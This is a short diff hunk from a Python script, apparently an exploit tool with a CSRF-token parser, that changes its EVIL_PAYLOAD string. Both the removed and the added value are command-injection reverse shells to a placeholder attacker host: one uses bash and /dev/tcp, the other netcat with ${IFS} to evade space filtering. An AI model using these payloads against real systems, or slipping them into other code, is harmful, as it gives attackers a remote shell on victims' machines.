@@ -17,7 +17,7 @@ import urllib.request
 from html.parser import HTMLParser
 from pathlib import Path
 
-EVIL_PAYLOAD = "$(sh -i >& /dev/tcp/YOURIP/4444 0>&1)"
+EVIL_PAYLOAD = "$(nc${IFS}YOUR-IP-CHANGE-THIS${IFS}443${IFS}-e${IFS}sh)"
 
 
 class CsrfParser(HTMLParser):
